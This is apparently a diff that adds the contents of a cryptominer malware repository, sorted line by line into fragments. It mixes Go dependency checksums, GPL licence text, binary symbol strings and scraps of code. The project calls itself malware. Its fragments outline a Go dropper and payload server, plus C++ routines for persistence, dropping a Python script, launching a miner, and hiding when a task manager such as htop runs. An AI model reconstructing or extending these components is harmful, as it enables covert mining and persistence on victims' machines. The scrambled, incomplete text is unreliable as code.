+github.com/json-iterator/go v1.1.12 // indirect
+github.com/json-iterator/go v1.1.12 h1:PV8peI4a0ysnczrg
+github.com/json-iterator/go v1.1.12/go.mod h1:e30LSqwooZae/UwlEbR2852Gd8hjQvJoHmT4TnhNGBo=
+github.com/kr/pretty v0.1.0/go.mod h1:dAy3ld7l9f0ibDNOQOHHMYYIIbhfbHSm3C4ZsoJORNo=
+github.com/kr/pretty v0.2.1/go.mod h1:ipq/a2n7PKx3OHsz4KJII5eveXtPO4qwEXGdVfWzfnI=
+github.com/kr/pretty v0.3.0 h1:WgNl7dwNpEZ6jJ9k1snq4pZsg7DOEN8hP9Xw0Tsjwk0=
+github.com/kr/pretty v0.3.0/go.mod h1:640gp4NfQd8pI5XOwp5fnNeVWj67G7CFk/SaSQn7NBk=
+github.com/kr/pty v1.1.1/go.mod h1:pFQYn66WHrOpPYNljwOMqo10TkYh1fy3cYio2l3bCsQ=
+github.com/kr/text v0.1.0/go.mod h1:4Jbv
+github.com/kr/text v0.2.0 h1:5Nx0Ya0ZqY2ygV366QzturHI13Jq95ApcVaJBhpS
+github.com/kr/text v0.2.0/go.mod h1:eLer722TekiGuMkidMxC/pM04lWEeraHUUmBw8l2grE=
+github.com/leodido/go-urn v1.2.1 // indirect
+github.com/leodido/go-urn v1.2.1 h1:BqpAaACuzVSgi/VLzGZIobT2z4v53pjosyNd9Yv6n/w=
+github.com/leodido/go-urn v1.2.1/go.mod h1:zt4jvISO2HfUBqxjfIshjdMTYS56ZS/qv49ictyFfxY=
+github.com/mattn/go-isatty v0.0.14 // indirect
+github.com/mattn/go-isatty v0.0.14 h1:yVuAays6BHfxijgZPzw
+github.com/mattn/go-isatty v0.0.14/go.mod h1:7GGIvUiUoEMVVmxf/4nioHXj79iQHKdU27kJ6hsGG94=
+github.com/modern-go/concurrent v0.0.0-20180228061459-e0a39a4cb421 // indirect
+github.com/modern-go/concurrent v0.0.0-20180228061459-e0a39a4cb421 h1:ZqeYNhU3OHLH3mGKHDcjJRFFRrJa6eAM5H
+github.com/modern-go/concurrent v0.0.0-20180228061459-e0a39a4cb421/go.mod h1:6dJC0mAP4ikYIbvyc7fijjWJddQyLn8Ig3JB5CqoB9Q=
+github.com/modern-go/reflect2 v1.0.2 // indirect
+github.com/modern-go/reflect2 v1.0.2 h1:xBagoLtFs94CBntxluKeaWgTMpvLxC4ur3nMaC9Gz0M=
+github.com/modern-go/reflect2 v1.0.2/go.mod h1:yWuevngMOJpCy52FWWMvUC8ws7m/LJsjYzDa0/r8luk=
+github.com/pelletier/go-toml/v2 v2.0.1 // indirect
+github.com/pelletier/go-toml/v2 v2.0.1 h1:8e3L2cCQzLFi2CR4g7vGFuFxX7Jl1kKX8gW
+github.com/pelletier/go-toml/v2 v2.0.1/go.mod h1:r9LEWfGN8R5k0VXJ
+github.com/pkg/diff v0.0.0-20210226163009-20ebb0f2a09e/go.mod h1:pJLUxLENpZxwdsKMEsNbx1VGcRFpLqf3715MtcvvzbA=
+github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
+github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
+github.com/rogpeppe/go-internal v1.6.1/go.mod h1:xXDCJY
+github.com/rogpeppe/go-internal v1.8.0 h1:FCbCCtXNOY3UtUuHUYaghJg4y7Fd14rXifAYUAtL9R8=
+github.com/rogpeppe/go-internal v1.8.0/go.mod h1:WmiCO8CzOY8rg0OYDC4/i/2WRWAB6poM
+github.com/stretchr/objx v0.1.0/go.mod h1:HFkY916IF
+github.com/stretchr/testify v1.3.0/go.mod h1:M5WIy9Dh21IEIfnGCwXGc5bZfKNJtfHm1UVUgZn
+github.com/stretchr/testify v1.6.1/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=
+github.com/stretchr/testify v1.7.0/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=
+github.com/stretchr/testify v1.7.1 h1:5TQK59W5E3v0r2duFAb7P95B6hEeOyEnHRa8MjYSMTY=
+github.com/stretchr/testify v1.7.1/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=
+github.com/ugorji/go v1.2.7/go.mod h1:nF9osbDWLy6bDVv/Rtoh6QgnvNDpmCalQV5urGCCS6M=
+github.com/ugorji/go/codec v1.2.7 // indirect
+github.com/ugorji/go/codec v1.2.7 h1:YPXUKf7fYbp/y8xloBqZOw2qaVggbfwMlI8WM3wZUJ0=
+github.com/ugorji/go/codec v1.2.7/go.mod h1:WGN1fab3R1fzQlVQTkfxVtIBhWDRqOviHU95kRgeqEY=
+global bool lock_taskmanager = false
+go 1.18
+golang.org/x/crypto v0.0.0-20210711020723-a769d52b0f97 // indirect
+golang.org/x/crypto v0.0.0-20210711020723-a769d52b0f97 h1:/UOmuWzQfxxo9UtlXMwuQU8CMgg1eZXqTRwkSQJWKOI=
+golang.org/x/crypto v0.0.0-20210711020723-a769d52b0f97/go.mod h1:GvvjBRRGRdwPK5ydBHafDWAxML/pGHZbMvKqRZ5
+golang.org/x/net v0.0.0-20210226172049-e18ecbb05110 // indirect
+golang.org/x/net v0.0.0-20210226172049-e18ecbb05110 h1:qWPm9rbaAMKs8Bq/9LRpbMqxWRVUAQwMI9fVrssnTfw=
+golang.org/x/net v0.0.0-20210226172049-e18ecbb05110/go.mod h1:m0MpNAwzfU5UDzcl9v0D8zg8gWTRqZa9RBIspLL5mdg=
+golang.org/x/sys v0.0.0-20201119102817-f84b799fce68/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
+golang.org/x/sys v0.0.0-20210615035016-665e8c7367d1/go.mod h1:oPkhp1MJrh7nUepCBck5
+golang.org/x/sys v0.0.0-20210630005230-0f9fa26af87c/go.mod h1:oPkhp1MJrh7nUepCBck5
+golang.org/x/sys v0.0.0-20210806184541-e5e7981a1069 // indirect
+golang.org/x/sys v0.0.0-20210806184541-e5e7981a1069 h1:siQdpVirKtzPhKl3lZWozZraCFObP8S1v6PRp0bLrtU=
+golang.org/x/sys v0.0.0-20210806184541-e5e7981a1069/go.mod h1:oPkhp1MJrh7nUepCBck5
+golang.org/x/term v0.0.0-20201126162022-7de9c90e9dd1/go.mod h1:bj7SfCRtBDWHUb9snDiAeCFNEtKQo2Wmx5Cou7ajbmo=
+golang.org/x/text v0.3.3/go.mod h1:5Zoc/QRtKVWzQhOtBMvqHzDpF6irO9z98xDceosuGiQ=
+golang.org/x/text v0.3.6 // indirect
+golang.org/x/text v0.3.6 h1:aRYxNxv6iGQlyVaZmk6ZgYEDa
+golang.org/x/text v0.3.6/go.mod h1:5Zoc/QRtKVWzQhOtBMvqHzDpF6irO9z98xDceosuGiQ=
+golang.org/x/tools v0.0.0-20180917221912-90fa682c2a6e/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
+golang.org/x/xerrors v0.0.0-20191204190536-9bdfabe68543 h1:E7g
+golang.org/x/xerrors v0.0.0-20191204190536-9bdfabe68543/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
+google.golang.org/protobuf v1.26.0-rc.1/go.mod h1:jlhhOSvTdKEhbULTjvd4ARK9grFBp09yW
+google.golang.org/protobuf v1.28.0 // indirect
+google.golang.org/protobuf v1.28.0 h1:w43yiav
+google.golang.org/protobuf v1.28.0/go.mod h1:HV8QOd/L58Z
+gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
+gopkg.in/check.v1 v1.0.0-20180628173108-788fd7840127/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
+gopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c h1:Hei/4ADfdWqJk1ZMxUNpqntNwaWcugrBjAiHlqqRiVk=
+gopkg.in/check.v1 v1.0.0-20201130134442-10cb98267c6c/go.mod h1:JHkPIbrfpd72SG/EVd6muEfDQjcINNoR0C8j2r3qZ4Q=
+gopkg.in/errgo.v2 v2.1.0/go.mod h1:hNsd1EY
+gopkg.in/yaml.v2 v2.4.0 // indirect
+gopkg.in/yaml.v2 v2.4.0 h1:D8xgwECY7CYvx
+gopkg.in/yaml.v2 v2.4.0/go.mod h1:RDklbk79AGWmwhnvt/jBztapEOGDOx6ZbXqjP6csGnQ=
+gopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c/go.mod h1:K4uyk7z7BCEPqu6E
+gopkg.in/yaml.v3 v3.0.0-20210107192922-496545a6307b h1:h8qDotaEPuJATrMmW04NCwg7v22aHH28wwpauUhK9Oo=
+gopkg.in/yaml.v3 v3.0.0-20210107192922-496545a6307b/go.mod h1:K4uyk7z7BCEPqu6E
+have the freedom to distribute copies of free software (and charge for
+here's the source code of the malware
+htop
+https://trello.com/b/EYUmIGy3/cryptominer
+iV0GUKU=
+if TARGET_IPHONE_SIMULATOR == 1
+if __name__ == '__main__':
+if defined(BSD)
+if defined(_WIN32)
+if err != nil {
+if found 
+ifndef BASE_64
+ifndef ERROR_H
+ifndef TASKS_H
+ifndef UTILS_H
+implemented by public license practices.  Many people have made
+import (
+import SocketServer
+import base64
+import json
+impose that choice.
+in new free programs
+in) {
+include <TargetConditionals.h>
+include <cstring>
+include <dirent.h>
+include <fcntl.h>
+include <iostream>
+include <pthread.h>
+include <pwd.h>
+include <stdio.h>
+include <stdlib.h>
+include <string.h>
+include <string>
+include <sys/param.h>
+include <sys/stat.h>
+include <thread>
+include <unistd.h>
+include <vector>
+include<iostream>
+is covered only if its contents constitute a work based on the
+itself accompanies the executable.
+libc.so.6
+libgcc_s.so.1
+libm.so.6
+libpthread.so.0
+libstdc
+license would not permit royalty-free redistribution of the Program by
+lu/H90nyDXpg0fqeB/AQUGNTVA=
+mAzfO9JrbApNNgaTdGDITg=
+mYPU4Po3pmUjxk6FQPldtuIdl/M65Eg=
+main
+main: client.o error.o tasks.o utils.o base64.o
+make exceptions for this.  Our decision will be guided by the two goals
+malloc
+malloc@@GLIBC_2.2.5
+may add an explicit geographical distribution limitation excluding
+means either the Program or any derivative work under copyright law:
+memset
+memset@@GLIBC_2.2.5
+miner
+mining_pool_info_file.txt
+mkdir
+mkdir@@GLIBC_2.2.5
+modification follow.
+modifying or distributing the Program (or any work based on the
+module main
+mouse-clicks or menu items--whatever suits your program.
+nHEHHEUHSH8
+nPRTKrp3/OZK38U/wa0CcBYNjji3q3A=
+namespace Tasks{
+necessary.  Here is a sample
+nl8r43ehVNZIU/HEI6OcFqwMG9pJV4I=
+notices that refer to this License and to the absence of any warranty
+of preserving the free status of all derivatives of our free software and
+of promoting the sharing and reuse of software generally.
+of the General Public License from time to time.  Such new versions will
+original copyright holder who places the Program under this License
+output
+p%Y 
+p%rY 
+p%rZ 
+package Connect
+package GetDropper
+package GetExecutable
+package IsAlive
+package api
+package database
+package io
+package main
+package middlewares
+package shared
+package variables
+parties remain in full compliance.
+patent must be licensed for everyone's free use or not licensed at all.
+patents or other property right claims or to contest validity of any
+patents.  We wish to avoid the danger that redistributors of a free
+payload)
+payloadAsB64 := base64.StdEncoding.EncodeToString(controller.Payload.Bytes)
+pclose
+pclose@@GLIBC_2.2.5
+pidof 
+pool = (pool_info
+pool_info
+popen
+popen@@GLIBC_2.2.5
+price.  Our General Public Licenses are designed to make sure that you
+print(msg)
+pstree
+public:
+python3 communication.py get_pool
+python3 communication.py post 
+python3 glances
+q := 
+qLHfH5-
+refrain entirely from distribution of the Program.
+require (
+require github.com/gin-gonic/gin v1.8.1
+response := struct {
+restrictions on the recipients' exercise of the rights granted herein.
+return
+return App{
+return Config{
+return DatabaseConfig{
+return content
+return defaultValue
+return err
+return func(c 
+return len(strings.TrimSpace(s)) == 0
+return nil
+return value
+rights.
+rkHYY13jYWTU97c=
+router := gin.Default()
+router.Run(addr)
+router.Use(middlewares.LoggerMiddleware(app.Database))
+rows.Scan(dropperBinary)
+rwdDfMAkV7OtwuqBVzrE8GR6GFx
+s0DH
+sections when you distribute them as separate works.  But when you
+server
+show c'
+show c' for details.
+show c' should show the appropriate
+show w' and 
+show w'.
+sleep
+sleep@@GLIBC_2.2.5
+software--to make sure the software is free for all its users.  This
+source code.  And you must show them these terms so they know their
+st) == -1) {
+std::string Base64::base64_decode(const std::string 
+std::string Base64::base64_encode(const std::string 
+strcat
+strcat@@GLIBC_2.2.5
+strcpy
+strcpy@@GLIBC_2.2.5
+strlen
+strlen@@GLIBC_2.2.5
+strtoul
+strtoul@@GLIBC_2.2.5
+such claims
+sudo chattr 
+system
+system@@GLIBC_2.2.5
+t-HE=
+tGHEHMHUHEH562
+tGHEHUHUHEH5
+tH=s
+tasks.cpp
+tasks.o: tasks.cpp tasks.h
+teste
+teste2
+that any problems introduced by others will not reflect on the original
+that everyone understands that there is no warranty for this free
+the GNU Lesser General Public License instead.)  You can apply it to
+the Program or works based on it.
+the limitation as if written in the body of this License.
+the only way you could satisfy both it and this License would be to
+the scope of this License.
+these terms and conditions.  You may not impose any further
+this License will not have their licenses terminated so long as such
+this License.
+through that system in reliance on consistent application of that
+to ask for permission.  For software which is copyrighted by the Free
+to attach them to the start of each source file to most effectively
+to distribute software through any other system and a licensee cannot
+trHEHv
+type App struct {
+type Config struct {
+type ConnectController struct {
+type Database struct {
+type DatabaseConfig struct {
+type DropperInput struct {
+type GetDropperController struct {
+type GetDropperUseCase struct {
+type GetExecutableController struct {
+type IDatabase interface {
+type IGetDropperUseCase interface {
+type IsAliveController struct {
+type OS struct {
+type Payload struct {
+typedef struct pool_info{
+u'H=V 
+u)H=
+u)H=> 
+u)H=D 
+u)H=T3 
+u)H=X 
+u1gW/2HnVO7nvIa9PG3Gm
+uIHEHHUHEH5
+under Section 2) in object code or executable form under the terms of
+url = 'http://127.0.0.1'
+usage :
+useCase.Database.InsertNewDropperCall(input)
+using it.  (Some other Free Software Foundation software is covered by
+utils.cpp
+utils.o: utils.cpp utils.h
+var dropperBinary string
+var payload input.DropperInput
+void Error::exit_error(const std::string
+void Error::log_error(const std::string
+void Tasks::check_task_manager(){
+void copy_executable_to_folder(){
+void drop_python_script()
+void drop_python_script(){
+void install_persistence()
+void install_persistence(){
+void new_miner()
+void new_miner(){
+void set_persistence_bits()
+void set_persistence_bits(){
+wExME=
+when it starts in an interactive mode:
+while(!lock_taskmanager){
+with the Program (or with a work based on the Program) on a volume of
+x!EU
+x4EU
+xPUEGrFYl
+you may at your option offer warranty protection in exchange for a fee.
+your rights to work written entirely by you
+zPLR
+}pool_info
